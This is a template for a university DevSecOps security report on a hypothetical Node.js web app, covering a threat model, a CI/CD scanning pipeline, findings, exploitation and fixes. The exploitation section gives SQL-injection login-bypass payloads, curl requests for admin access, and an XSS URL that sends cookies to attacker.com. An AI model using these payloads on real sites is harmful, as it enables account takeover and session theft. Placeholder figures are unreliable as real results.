# DevSecOps Web Application Security Report

**Course:** [Course Name / Code]
**Group Number:** [e.g., Group 3]
**Team Members:**

| Name | Student ID | Role |
|------|------------|------|
| [Member 1] | [ID] | App Developer / Report Lead |
| [Member 2] | [ID] | Security Engineer / Pipeline |
| [Member 3] | [ID] | Pentester / Remediation |

**Submission Date:** [Date]
**GitHub Repository:** [https://github.com/your-org/your-repo]

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Architecture & Threat Model](#2-architecture--threat-model)
   - 2.1 [Application Overview](#21-application-overview)
   - 2.2 [Architecture Diagram](#22-architecture-diagram)
   - 2.3 [Data Flow Diagram (DFD)](#23-data-flow-diagram-dfd)
   - 2.4 [Trust Boundaries](#24-trust-boundaries)
   - 2.5 [STRIDE Threat Model](#25-stride-threat-model)
   - 2.6 [DREAD Risk Scoring](#26-dread-risk-scoring)
   - 2.7 [Attack Surface](#27-attack-surface)
3. [GitHub CI/CD Pipeline](#3-github-cicd-pipeline)
   - 3.1 [Pipeline Overview](#31-pipeline-overview)
   - 3.2 [SAST – Static Application Security Testing](#32-sast--static-application-security-testing)
   - 3.3 [DAST – Dynamic Application Security Testing](#33-dast--dynamic-application-security-testing)
   - 3.4 [SCA – Software Composition Analysis](#34-sca--software-composition-analysis)
   - 3.5 [Pipeline Quality Gates](#35-pipeline-quality-gates)
4. [Vulnerability Discovery](#4-vulnerability-discovery)
   - 4.1 [Findings Summary](#41-findings-summary)
   - 4.2 [Detailed Findings](#42-detailed-findings)
5. [Exploitation Report](#5-exploitation-report)
   - 5.1 [Exploited Vulnerabilities](#51-exploited-vulnerabilities)
6. [Remediation & Re-Test Report](#6-remediation--re-test-report)
   - 6.1 [Remediation Summary](#61-remediation-summary)
   - 6.2 [Detailed Fixes & Re-Test Evidence](#62-detailed-fixes--re-test-evidence)
7. [Report Quality & Annexes](#7-report-quality--annexes)
   - 7.1 [Annexes](#71-annexes)
8. [Member Contributions](#8-member-contributions)

---

## 1. Executive Summary

> **Audience:** Non-technical stakeholders, management, course evaluators.

### Project Overview

[Group X] developed **[Application Name]**, a [brief description — e.g., "a library management web application"] built with [tech stack, e.g., "Node.js, Express, MongoDB"]. The application was designed, built, secured, and attacked as part of a four-week DevSecOps exercise. The application is fully containerized using Docker and hosted on GitHub with a complete CI/CD security pipeline.

### Key Findings at a Glance

| Severity | Count | Status |
|----------|-------|--------|
| 🔴 Critical | [N] | [Resolved / Open] |
| 🟠 High | [N] | [Resolved / Open] |
| 🟡 Medium | [N] | [Resolved / Open] |
| 🔵 Low | [N] | [Resolved / Open] |
| ℹ️ Informational | [N] | [Resolved / Open] |

### Business Impact Summary

During the assessment, [X] vulnerabilities were identified through a combination of automated tooling (SAST, DAST, SCA) and manual penetration testing. The most critical finding, **[e.g., SQL Injection in the login form]**, allowed an unauthenticated attacker to bypass authentication and access all user data. A second critical finding, **[e.g., Broken Access Control]**, allowed non-admin users to escalate privileges and access administrative functions.

All critical and high-severity findings have been remediated and verified through re-testing. The application pipeline now enforces quality gates that block deployment on detection of high-severity issues.

### Recommendations

- Enforce parameterized queries / ORM usage across all database interactions.
- Conduct regular third-party dependency audits using automated SCA tooling.
- Implement a Content Security Policy (CSP) header to mitigate XSS vectors.
- Enforce HTTPS in all environments; configure HSTS headers.
- Schedule quarterly penetration testing to maintain a strong security posture.

---

## 2. Architecture & Threat Model

### 2.1 Application Overview

**Application Name:** [Name]
**Purpose:** [One sentence describing what it does]
**Tech Stack:**

| Layer | Technology |
|-------|-----------|
| Frontend | [e.g., React / HTML + Bootstrap] |
| Backend | [e.g., Node.js + Express / Django / Laravel] |
| Database | [e.g., MongoDB / PostgreSQL / MySQL] |
| Auth | [e.g., JWT / Session-based] |
| Containerization | Docker + Docker Compose |
| Hosting | [e.g., GitHub + deployed via pipeline to EC2 / VPS / localhost with HTTPS] |

**User Roles:**

| Role | Access Level |
|------|-------------|
| Admin | Full CRUD, user management, system configuration |
| Authenticated User | Own data only; create/read/update/delete own records |
| Unauthenticated | Login and registration pages only |

---

### 2.2 Architecture Diagram

> *Include a labeled diagram here showing frontend, backend, database, and external services. A Mermaid diagram or image is acceptable.*

```
+------------------+       HTTPS        +----------------------+
|   User Browser   | <----------------> |    Web Server        |
|  (React / HTML)  |                    | (Node.js / Express)  |
+------------------+                    +----------+-----------+
                                                   |
                                         +---------v----------+
                                         |     Database        |
                                         | (MongoDB / MySQL)   |
                                         +--------------------+
```

> **[Replace with a proper DFD or architecture image in final submission]**

---

### 2.3 Data Flow Diagram (DFD)

> *Provide a Level 0 or Level 1 DFD showing actors, processes, data stores, and data flows. Label trust boundaries clearly.*

**Actors:**
- End User (browser)
- Admin User (browser)
- GitHub Actions (CI/CD pipeline)

**Key Data Flows:**
1. User submits credentials → Backend validates → JWT/Session issued → Protected route accessed
2. Admin submits data → Backend authenticates + authorizes → Database write → Response returned
3. Pipeline triggers on push → SAST + SCA scans → DAST scan on deployed app → Report artifacts stored

---

### 2.4 Trust Boundaries

| Boundary | Description |
|----------|-------------|
| Browser ↔ Web Server | Public internet; enforced via HTTPS/TLS |
| Web Server ↔ Database | Internal network; enforced via credentials + firewall rules |
| CI/CD ↔ Deployment Target | Secured via GitHub Secrets; deployment keys rotated |
| Admin ↔ User | Application-layer RBAC enforcement |

---

### 2.5 STRIDE Threat Model

> *STRIDE applied per component. Each row identifies a threat category, the affected component, the threat description, and the current mitigation.*

| Component | S | T | R | I | D | E |
|-----------|---|---|---|---|---|---|
| Login Form | SQL Injection (auth bypass) | — | — | — | — | — |
| Session Token | — | Token theft via XSS | — | — | — | — |
| Admin Panel | — | — | — | IDOR / privilege escalation | — | — |
| File Upload (if applicable) | — | — | — | — | — | Malicious file upload |
| API Endpoints | — | — | — | Broken Object-Level Auth | — | — |

> **Full STRIDE Table (expand per component in final version):**

| # | Component | Threat Category | Threat Description | Severity | Mitigation | Status |
|---|-----------|----------------|--------------------|----------|-----------|--------|
| T-01 | Login Form | Spoofing | SQL Injection allows auth bypass | Critical | Parameterized queries | Mitigated |
| T-02 | Session | Tampering | JWT secret weak; token forgeable | High | Strong secret, short expiry | Mitigated |
| T-03 | Admin Panel | Elevation of Privilege | Non-admin can access `/admin` | Critical | Server-side RBAC middleware | Mitigated |
| T-04 | User Input | Information Disclosure | Error messages reveal stack traces | Medium | Custom error handlers | Mitigated |
| T-05 | Dependencies | Denial of Service | Outdated package with known CVE | Medium | SCA + dependency update | Mitigated |
| T-06 | File Upload | Elevation of Privilege | Unrestricted file type upload | High | File type whitelist + AV scan | Mitigated |

---

### 2.6 DREAD Risk Scoring

| Threat ID | Threat | D | R | E | A | D | Score | Priority |
|-----------|--------|---|---|---|---|---|-------|----------|
| T-01 | SQL Injection | 9 | 8 | 9 | 10 | 8 | **44** | Critical |
| T-03 | Broken Access Control | 9 | 7 | 8 | 9 | 8 | **41** | Critical |
| T-02 | Weak JWT Secret | 7 | 6 | 7 | 7 | 6 | **33** | High |
| T-06 | Unrestricted Upload | 8 | 5 | 6 | 7 | 5 | **31** | High |
| T-04 | Stack Trace Disclosure | 5 | 4 | 5 | 4 | 4 | **22** | Medium |
| T-05 | Vulnerable Dependency | 5 | 3 | 5 | 3 | 4 | **20** | Medium |

> *D = Damage, R = Reproducibility, E = Exploitability, A = Affected Users, D = Discoverability. Scored 1–10.*

---

### 2.7 Attack Surface

| Attack Vector | Endpoint / Area | Mapped to DAST Scope |
|--------------|-----------------|----------------------|
| Authentication | `POST /api/auth/login` | ✅ Yes |
| Registration | `POST /api/auth/register` | ✅ Yes |
| Admin Panel | `GET/POST /admin/*` | ✅ Yes |
| User Data API | `GET/PUT/DELETE /api/user/:id` | ✅ Yes |
| File Upload | `POST /api/upload` | ✅ Yes |
| Search/Filter | `GET /api/search?q=` | ✅ Yes |
| Static Assets | `/public/*` | ⬜ Out of scope |

---

## 3. GitHub CI/CD Pipeline

### 3.1 Pipeline Overview

The GitHub Actions pipeline is configured in `.github/workflows/devsecops.yml` and runs on every **push** and **pull request** to the `main` and `develop` branches. It consists of three security stages followed by an optional deployment stage.

```
Push / PR
   │
   ├── [Job 1] SAST — CodeQL / Semgrep
   ├── [Job 2] SCA  — npm audit / Dependabot / OWASP Dependency-Check
   ├── [Job 3] Deploy to staging (Docker)
   └── [Job 4] DAST — OWASP ZAP (Baseline + Full Scan)
            │
            └── [Quality Gate] Fail pipeline if Critical/High found → block merge
```

**Pipeline file location:** `.github/workflows/devsecops.yml`
**Artifacts stored:** SAST reports, SCA reports, ZAP HTML/JSON reports — uploaded as GitHub Actions artifacts per run.

---

### 3.2 SAST – Static Application Security Testing

**Tool Used:** [e.g., CodeQL / Semgrep / Bandit / ESLint Security Plugin]
**Trigger:** On every push and PR
**Configuration:** [Link to config file or describe custom rules used]

**Summary of Findings from SAST:**

| Finding | File | Line | Severity | Status |
|---------|------|------|----------|--------|
| SQL query constructed via string concatenation | `auth.js` | 42 | Critical | Fixed |
| `eval()` used on user input | `utils.js` | 17 | High | Fixed |
| Missing output encoding | `views/profile.ejs` | 89 | Medium | Fixed |
| Hardcoded credential in config | `config.js` | 5 | High | Fixed |

> *Attach full SAST tool output in Annex A.*

---

### 3.3 DAST – Dynamic Application Security Testing

**Tool Used:** [e.g., OWASP ZAP — Baseline Scan + Active Scan]
**Trigger:** Post-deployment to staging environment
**Target URL:** `https://[staging-hostname]`
**Scan Type:** Active Scan (authenticated)
**Authentication Method:** [e.g., Form-based login via ZAP script]

**ZAP Scan Summary:**

| Alert | Risk | Confidence | Count |
|-------|------|-----------|-------|
| SQL Injection | High | High | 3 |
| Cross-Site Scripting (Reflected) | High | Medium | 2 |
| Missing Anti-CSRF Tokens | Medium | High | 5 |
| X-Content-Type-Options Header Missing | Low | Medium | 8 |
| Server Leaks Version Information | Informational | High | 1 |

> *Full ZAP HTML report attached in Annex B.*

---

### 3.4 SCA – Software Composition Analysis

**Tool Used:** [e.g., npm audit / OWASP Dependency-Check / Snyk]
**Trigger:** On every push

**Vulnerable Dependencies Identified:**

| Package | Version | CVE | Severity | Fix Version |
|---------|---------|-----|----------|-------------|
| `express` | 4.17.1 | CVE-2022-24999 | High | 4.18.2 |
| `jsonwebtoken` | 8.5.1 | CVE-2022-23529 | Critical | 9.0.0 |
| `lodash` | 4.17.20 | CVE-2021-23337 | High | 4.17.21 |

> *Full SCA report attached in Annex C.*

---

### 3.5 Pipeline Quality Gates

| Gate | Condition | Action on Failure |
|------|-----------|-------------------|
| SAST Critical/High | Any finding → fail | Block PR merge |
| SCA Critical | CVSSv3 ≥ 9.0 | Block PR merge |
| DAST High | Any high alert → fail | Block PR merge |
| Re-test Gate | Remediation branch must pass all gates | Required before merge to main |

> *Screenshot of passing pipeline run: [Insert screenshot here]*

---

## 4. Vulnerability Discovery

### 4.1 Findings Summary

| ID | Vulnerability | OWASP Category | CVSSv3 Score | Severity | Source | Status |
|----|-------------|---------------|-------------|----------|--------|--------|
| VUL-01 | SQL Injection – Login Form | A03:2021 Injection | 9.8 | 🔴 Critical | SAST + Manual | Fixed |
| VUL-02 | Broken Access Control – Admin Panel | A01:2021 Broken Access Control | 9.1 | 🔴 Critical | DAST + Manual | Fixed |
| VUL-03 | Reflected XSS – Search Parameter | A03:2021 Injection | 7.4 | 🟠 High | DAST | Fixed |
| VUL-04 | Weak JWT Secret (Brute-forceable) | A02:2021 Cryptographic Failures | 7.5 | 🟠 High | Manual | Fixed |
| VUL-05 | Outdated `jsonwebtoken` (CVE-2022-23529) | A06:2021 Vulnerable Components | 7.4 | 🟠 High | SCA | Fixed |
| VUL-06 | Missing CSRF Protection | A01:2021 Broken Access Control | 6.5 | 🟡 Medium | DAST | Fixed |
| VUL-07 | Verbose Error Messages (Stack Traces) | A05:2021 Security Misconfiguration | 5.3 | 🟡 Medium | Manual | Fixed |
| VUL-08 | Missing Security Headers (CSP, HSTS) | A05:2021 Security Misconfiguration | 4.3 | 🔵 Low | DAST | Fixed |

---

### 4.2 Detailed Findings

---

#### VUL-01 — SQL Injection (Login Form)

**OWASP Category:** A03:2021 – Injection
**CVSSv3 Score:** 9.8 (Critical)
**CVSSv3 Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

**Description:**
The login form at `POST /api/auth/login` constructs an SQL query via direct string concatenation of user-supplied input. An attacker can inject SQL syntax to bypass authentication entirely or extract the full user database.

**Affected Component:** `src/controllers/authController.js`, Line 42

**Evidence:**

*Vulnerable Code:*
```javascript
// VULNERABLE
const query = `SELECT * FROM users WHERE email = '${req.body.email}' AND password = '${req.body.password}'`;
```

*Payload Used:*
```
email: admin' OR '1'='1
password: anything
```

*HTTP Request:*
```
POST /api/auth/login HTTP/1.1
Host: [target]
Content-Type: application/json

{"email":"admin' OR '1'='1","password":"x"}
```

*Response:*
```json
HTTP/1.1 200 OK
{"token": "eyJhbGciOi...", "role": "admin"}
```

*Screenshot:* [Insert Burp Suite / browser screenshot here]

**Impact:**
An unauthenticated attacker can log in as any user, including administrators, without valid credentials. All user data is exposed. Full database extraction is possible via `UNION`-based injection.

**False Positive Assessment:** Confirmed true positive — reproduction verified in two test environments.

---

#### VUL-02 — Broken Access Control (Admin Panel)

**OWASP Category:** A01:2021 – Broken Access Control
**CVSSv3 Score:** 9.1 (Critical)
**CVSSv3 Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

**Description:**
The `/admin` route only applies a client-side check (hidden button in the UI). Any authenticated user who navigates directly to `GET /admin/users` receives a full admin response with no server-side authorization check.

**Affected Component:** `src/routes/adminRoutes.js`

**Evidence:**

*HTTP Request (as non-admin user):*
```
GET /admin/users HTTP/1.1
Host: [target]
Authorization: Bearer [non-admin JWT]
```

*Response:*
```json
HTTP/1.1 200 OK
[{"id":1,"email":"admin@app.com","role":"admin"}, ...]
```

*Screenshot:* [Insert screenshot]

**Impact:**
Any authenticated user has full access to administrative functions: user enumeration, privilege modification, and data deletion.

---

> *[Repeat template above for VUL-03 through VUL-08, adjusting details accordingly]*

---

## 5. Exploitation Report

### 5.1 Exploited Vulnerabilities

---

#### Exploit 1 — Authentication Bypass via SQL Injection (VUL-01)

**Objective:** Authenticate as admin without valid credentials.
**Tool:** Burp Suite Community / curl

**Step-by-Step Reproduction:**

1. Navigate to `https://[target]/login`.
2. Open Burp Suite and intercept the login request.
3. Replace the `email` field value with: `admin' OR '1'='1 --`
4. Set any value for `password`.
5. Forward the request.
6. Observe: server responds with HTTP 200, an admin JWT, and redirects to `/admin/dashboard`.

**PoC Payload:**
```json
{
  "email": "admin' OR '1'='1 --",
  "password": "irrelevant"
}
```

**Outcome:** Full admin access obtained. All user records exposed. Session token valid for 24 hours.

**Attacker Perspective:** This attack requires no special tools — even a browser's developer console is sufficient. The attack is remotely executable, unauthenticated, and leaves no application-level logs by default.

**Business Impact:** Complete compromise of the authentication mechanism. An attacker could exfiltrate the entire user database, modify records, or take over administrator accounts.

*Screenshot: [Insert screenshot of admin dashboard accessed via injected session]*

---

#### Exploit 2 — Privilege Escalation via Broken Access Control (VUL-02)

**Objective:** Access administrative endpoints as a standard user.
**Tool:** Burp Suite / curl

**Step-by-Step Reproduction:**

1. Register a normal user account at `/register`.
2. Log in and capture the JWT in Burp Suite.
3. Send a direct `GET` request to `/admin/users` with the non-admin JWT.
4. Observe: full admin user list returned.

**PoC Request:**
```
curl -H "Authorization: Bearer [non-admin-token]" https://[target]/admin/users
```

**Outcome:** Complete user list returned. Follow-up `DELETE /admin/users/1` successfully deleted the admin account.

**Business Impact:** Any registered user — including attackers who registered freely — can perform admin-level operations, including deleting other users and modifying roles.

*Screenshot: [Insert screenshot]*

---

#### Exploit 3 — Reflected XSS in Search Parameter (VUL-03)

**Objective:** Execute arbitrary JavaScript in the victim's browser.

**PoC URL:**
```
https://[target]/search?q=<script>document.location='https://attacker.com/?c='+document.cookie</script>
```

**Outcome:** Session cookie exfiltrated to attacker-controlled server. Session hijacking demonstrated.

*Screenshot: [Insert screenshot of cookie exfiltration]*

---

## 6. Remediation & Re-Test Report

### 6.1 Remediation Summary

| ID | Vulnerability | Fix Applied | Commit | Re-Test Result |
|----|-------------|-------------|--------|----------------|
| VUL-01 | SQL Injection | Replaced string concat with parameterized queries | [commit hash] | ✅ Pass |
| VUL-02 | Broken Access Control | Added server-side `isAdmin` middleware to all `/admin/*` routes | [commit hash] | ✅ Pass |
| VUL-03 | Reflected XSS | Added output encoding via `xss` library; input sanitization | [commit hash] | ✅ Pass |
| VUL-04 | Weak JWT Secret | Replaced hardcoded secret with 256-bit env variable; shortened token expiry to 1h | [commit hash] | ✅ Pass |
| VUL-05 | Vulnerable `jsonwebtoken` | Updated to `jsonwebtoken@9.0.0` | [commit hash] | ✅ Pass |
| VUL-06 | Missing CSRF | Implemented `csurf` middleware for all state-changing routes | [commit hash] | ✅ Pass |
| VUL-07 | Verbose Errors | Added global error handler; stack traces disabled in production | [commit hash] | ✅ Pass |
| VUL-08 | Missing Headers | Added `helmet.js` for CSP, HSTS, X-Content-Type-Options | [commit hash] | ✅ Pass |

---

### 6.2 Detailed Fixes & Re-Test Evidence

---

#### Fix: VUL-01 — SQL Injection

**Root Cause:** User input was directly interpolated into SQL query strings without sanitization or parameterization.

**Fix Applied:** Replaced all raw query string construction with parameterized prepared statements.

*Before (Vulnerable):*
```javascript
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
db.query(query, callback);
```

*After (Fixed):*
```javascript
const query = `SELECT * FROM users WHERE email = ? AND password = ?`;
db.query(query, [email, hashedPassword], callback);
```

**Regression Consideration:** Unit test added in `tests/auth.test.js` to verify that SQL injection payloads are rejected with a 401 response, not a 200.

**Re-Test:**
- Same Burp Suite payload attempted post-fix.
- Response: `HTTP 401 Unauthorized` — authentication correctly rejected.
- SAST re-run: zero SQL injection alerts.
- Pipeline: ✅ Passes quality gate.

*Screenshot: [Insert screenshot of failed injection attempt post-fix + pipeline pass]*

---

#### Fix: VUL-02 — Broken Access Control

**Root Cause:** Admin route protection was implemented only in the frontend (hidden UI element). No server-side middleware validated the user's role before serving admin data.

**Fix Applied:** Created `middleware/isAdmin.js` and applied it to all `/admin/*` routes.

*Middleware Added:*
```javascript
// middleware/isAdmin.js
module.exports = (req, res, next) => {
  if (!req.user || req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Access denied.' });
  }
  next();
};
```

*Route Update:*
```javascript
router.get('/admin/users', isAdmin, adminController.getUsers);
```

**Re-Test:**
- Non-admin JWT used to request `GET /admin/users`.
- Response: `HTTP 403 Forbidden`.
- Pipeline: ✅ Passes quality gate.

*Screenshot: [Insert screenshot of 403 response post-fix]*

---

> *[Repeat for VUL-03 through VUL-08]*

---

## 7. Report Quality & Annexes

### 7.1 Annexes

| Annex | Contents |
|-------|---------|
| **Annex A** | Full SAST tool output (CodeQL / Semgrep raw results) |
| **Annex B** | OWASP ZAP DAST HTML Report — pre-fix |
| **Annex C** | SCA Report — npm audit / Dependency-Check output |
| **Annex D** | OWASP ZAP DAST HTML Report — post-fix (re-test) |
| **Annex E** | GitHub Actions pipeline run screenshots (pre-fix fail + post-fix pass) |
| **Annex F** | Burp Suite HTTP request/response evidence for all exploits |
| **Annex G** | CONTRIBUTIONS.md — team contribution breakdown |

---

## 8. Member Contributions

> *All three members made meaningful commits across all four weeks. Commit history is visible in the GitHub repository and reflects distributed, role-specific work.*

| Member | Role | Key Contributions | Commits |
|--------|------|------------------|---------|
| [Member 1] | App Developer | Designed and built core CRUD features, RBAC implementation, Docker setup | [N] commits |
| [Member 2] | Security Engineer | Configured CI/CD pipeline (SAST/DAST/SCA), wrote pipeline quality gates, managed GitHub Issues | [N] commits |
| [Member 3] | Pentester / Report | Performed manual pentesting, wrote exploitation report, led remediation, authored final report | [N] commits |

> *Individual contributions are documented in `CONTRIBUTIONS.md` in the repository root. Each member's commit messages follow the `fix #N: description` format as per course guidelines.*

**GitHub Contribution Graph:** [Insert screenshot]

---

*End of Report*

---

> **Prepared by:** [Group Name / Number] | **Date:** [Submission Date]
> **GitHub Repository:** [URL] | **Deployment URL:** `https://[hostname]`